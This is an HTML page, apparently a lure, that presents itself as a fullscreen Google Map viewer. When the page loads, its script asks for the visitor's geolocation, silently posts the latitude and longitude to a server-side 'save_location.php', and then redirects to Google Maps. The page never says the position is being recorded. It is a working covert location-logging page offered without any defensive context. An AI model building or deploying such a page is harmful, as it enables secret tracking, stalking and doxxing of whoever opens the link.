<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Map Fullscreen</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
    }

    #map-container {
      width: 100%;
      height: 100%;
    }

    iframe {
      width: 100%;
      height: 100%;
      border: 0;
    }
  </style>
</head>
<body>
<script>
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(sendLocation, showError);
} else {
  document.body.innerHTML = "Geolocation is not supported by this browser.";
}

function sendLocation(position) {
  var lat = position.coords.latitude;
  var lng = position.coords.longitude;
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "save_location.php", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("lat=" + lat + "&lng=" + lng);
  xhr.onreadystatechange = function() {
    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
      window.location.href = "https://www.google.com/maps?q=" + lat + "," + lng;
    }
  };
}

function showError(error) {
  var message = "";
  switch(error.code) {
    case error.PERMISSION_DENIED:
      message = "User denied the request for Geolocation.";
      break;
    case error.POSITION_UNAVAILABLE:
      message = "Location information is unavailable.";
      break;
    case error.TIMEOUT:
      message = "The request to get user location timed out.";
      break;
    case error.UNKNOWN_ERROR:
      message = "An unknown error occurred.";
      break;
  }
  document.body.innerHTML = message;
}
</script>
<div id="map-container">
  <iframe
    src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3241.707037377351!2d139.70263721525693!3d35.69487478019137!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x60188cd37a3e0c2d%3A0x6e8a92f54f39a567!2z5paw5a6_5ZKM5bel5qWt!5e0!3m2!1sen!2sjp!4v1618351156052!5m2!1sen!2sjp"
    allowfullscreen>
  </iframe>
</div>
</body>
</html>